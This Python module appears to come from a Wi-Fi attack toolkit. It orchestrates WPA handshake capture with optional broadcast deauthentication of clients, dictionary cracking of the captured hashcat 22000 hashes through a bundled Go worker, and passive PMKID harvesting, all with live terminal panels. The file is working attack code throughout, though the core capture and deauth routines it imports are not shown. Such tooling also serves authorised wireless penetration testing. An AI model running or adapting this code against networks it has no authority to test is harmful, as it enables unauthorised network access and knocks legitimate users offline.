"""Native attack orchestration with live CLI rendering.

These handlers replace the subprocess-wrapping flows with direct calls into
``capture``, ``attacks`` and the Go crack worker. Each one draws a different
live panel via ``ui_attack`` so the operator sees phase-specific information
instead of a scrolling log.
"""

from __future__ import annotations

import os
import shutil
import subprocess
import threading
import time
from typing import Optional

from . import adapter_probe, attacks, capture, mode_helper, ui_attack
from .ui_renderer import UIRenderer as UI

try:
    from rich.console import Console
    _console = Console()
except ImportError:  # pragma: no cover
    _console = None


def _engine_bin() -> Optional[str]:
    base = os.path.join(os.path.dirname(__file__), "go_workers", "bin", "hackit-worker")
    if os.name == "nt":
        base += ".exe"
    return base if os.path.exists(base) else None


def _prepare_monitor(iface: str) -> Optional[str]:
    caps = adapter_probe.probe(iface)
    if not caps.supports_monitor:
        UI.print_error(f"{iface} has no monitor mode — use a monitor-capable adapter")
        return None
    if caps.is_monitor:
        return caps.name
    if not mode_helper.is_root():
        UI.print_error("monitor mode requires root — run with sudo")
        return None
    result = mode_helper.set_monitor(iface)
    if not result.ok:
        UI.print_error(result.message)
        return None
    return result.final_iface or iface


# --------------------------------------------------------------------------- #
# Handshake capture
# --------------------------------------------------------------------------- #


def handshake_capture(iface: str, bssid: str = "", ssid: str = "",
                      channel: int = 0, timeout: float = 30.0,
                      deauth: bool = False, out: str = "") -> dict:
    """Capture a WPA 4-way handshake with a live panel."""
    target = _prepare_monitor(iface)
    if not target:
        return {}

    if channel:
        attacks.set_channel(target, channel)
        ui_attack.banner_phase(
            "capture",
            f"{ssid or 'any SSID'} on channel {channel} for {timeout:.0f}s"
            + (" — deauth assist enabled" if deauth else ""),
            ui_attack.ACCENT_CAPTURE,
        )

    session = capture.CaptureSession(target, bssid_filter=bssid or None, ssid_hint=ssid)
    stop = threading.Event()
    stats = {"packets": 0, "handshakes": 0, "pmkids": 0, "elapsed": 0.0, "status": "running"}

    if deauth and bssid:
        def kick():
            # Lock to the capture channel: hopping would pull the radio off
            # the target and starve the sniffer.
            cfg = attacks.DeauthConfig(
                iface=target, bssid=bssid, stations=[attacks.BROADCAST_MAC],
                channel=channel or 0, hop_channels=False, cycle_delay=2.0,
                duration=timeout,
            )
            attacks.run_deauth(cfg, stop_event=stop)
        threading.Thread(target=kick, daemon=True).start()

    def progress(s: dict) -> None:
        stats.update(s)

    started = time.time()
    with ui_attack.LiveView(lambda step: ui_attack.capture_panel(stats, ssid, bssid, step)) as view:
        runner = threading.Thread(
            target=lambda: session.run(duration=timeout), daemon=True,
        )
        runner.start()
        while runner.is_alive():
            time.sleep(0.4)
            stats["elapsed"] = time.time() - started
            stats["handshakes"] = len(session.handshakes)
            stats["pmkids"] = len(session.pmkids)
            stats["packets"] = session.packet_count
            view.update()
    stop.set()

    complete = session.complete_handshakes()
    session_summary = {
        "packets": session.packet_count,
        "complete": len(complete),
        "pmkids": len(session.pmkids),
    }

    if complete or session.pmkids:
        path = out or os.path.join(
            "/tmp", f"hackit_hs_{int(time.time())}.22000"
        )
        export = session.export_22000(path)
        UI.print_success(
            f"Captured {len(complete)} handshake(s), {len(session.pmkids)} PMKID(s)"
        )
        UI.print_info(f"hashcat 22000 → {export['path']} ({export['lines']} line(s))")
        session_summary["hashfile"] = export["path"]
    else:
        UI.print_warning(
            "No handshake captured. The client may already be associated — "
            "retry with --deauth, or wait for a reconnect."
        )
        if session_summary["packets"] == 0:
            UI.print_error(
                "Zero frames seen: the adapter is not receiving on this channel. "
                "Confirm monitor mode and channel lock."
            )

    mode_helper.set_managed(target)
    return session_summary


# --------------------------------------------------------------------------- #
# Crack with live progress
# --------------------------------------------------------------------------- #


def crack(hashfile: str, wordlist: str, ssid_hint: str = "") -> Optional[str]:
    """Crack a 22000 file with the Go worker and a live progress panel."""
    if not os.path.exists(hashfile):
        UI.print_error(f"hash file not found: {hashfile}")
        return None
    if not os.path.exists(wordlist):
        UI.print_error(f"wordlist not found: {wordlist}")
        return None

    binary = _engine_bin()
    if not binary:
        UI.print_error("Go worker missing — run `build go`")
        return None

    ui_attack.banner_phase(
        "crack", f"{os.path.basename(hashfile)} × {os.path.basename(wordlist)}",
        ui_attack.ACCENT_CRACK,
    )

    total = 0
    try:
        with open(wordlist, "r", encoding="utf-8", errors="replace") as fh:
            total = sum(1 for _ in fh)
    except OSError:
        total = 0

    proc = subprocess.Popen(
        [binary, "crack", hashfile, wordlist],
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1,
    )

    found: Optional[str] = None
    tested = 0
    rate = 0.0
    current = ""
    started = time.time()

    try:
        for raw in proc.stdout:
            line = raw.strip()
            if not line:
                continue
            if "tested" in line and "p/s" in line:
                try:
                    tested = int(line.split("tested")[1].split()[0].split("/")[0])
                except (IndexError, ValueError):
                    pass
                rate = tested / max(0.1, time.time() - started)
                current = line[-40:]
                _console.print(
                    ui_attack.crack_progress(tested, total or 1, rate, current, ssid_hint or "target", found or "")
                )
            elif "PASSPHRASE:" in line:
                found = line.split("PASSPHRASE:", 1)[1].strip()
                UI.print_success(f"KEY FOUND → {found}")
                break
            elif "KEY FOUND" in line:
                # informational header printed before the PASSPHRASE line
                _console.print(f"  [bold green]{line}[/]")
            elif "no match" in line.lower():
                _console.print(f"  [dim]{line}[/]")
            else:
                _console.print(f"  [dim]{line}[/]")
    except KeyboardInterrupt:
        proc.terminate()
        UI.print_warning("crack interrupted")
    finally:
        proc.wait(timeout=5)

    if not found:
        UI.print_warning("passphrase not in wordlist")
    return found


# --------------------------------------------------------------------------- #
# PMKID capture
# --------------------------------------------------------------------------- #


def pmkid_capture(iface: str, bssid: str = "", channel: int = 0,
                  timeout: float = 20.0, out: str = "") -> dict:
    """Passive PMKID capture — no handshake needed when the AP exposes it."""
    target = _prepare_monitor(iface)
    if not target:
        return {}

    if channel:
        attacks.set_channel(target, channel)
    ui_attack.banner_phase(
        "pmkid", f"listening for association frames on {target}", ui_attack.ACCENT_CAPTURE,
    )

    session = capture.CaptureSession(target, bssid_filter=bssid or None)
    stats = {"packets": 0, "handshakes": 0, "pmkids": 0, "elapsed": 0.0}
    started = time.time()

    with ui_attack.LiveView(lambda step: ui_attack.capture_panel(stats, "PMKID", bssid, step)) as view:
        runner = threading.Thread(
            target=lambda: session.run(duration=timeout), daemon=True,
        )
        runner.start()
        while runner.is_alive():
            time.sleep(0.4)
            stats.update({
                "packets": session.packet_count,
                "handshakes": len(session.handshakes),
                "pmkids": len(session.pmkids),
                "elapsed": time.time() - started,
            })
            view.update()

    result = {"packets": session.packet_count, "pmkids": len(session.pmkids)}
    if session.pmkids:
        path = out or os.path.join("/tmp", f"hackit_pmkid_{int(time.time())}.22000")
        export = session.export_22000(path)
        UI.print_success(f"Captured {export['lines']} PMKID hash(es) → {export['path']}")
        result["hashfile"] = export["path"]
    else:
        UI.print_warning("no PMKID exposed — this AP does not send the PMKID KDE")

    mode_helper.set_managed(target)
    return result
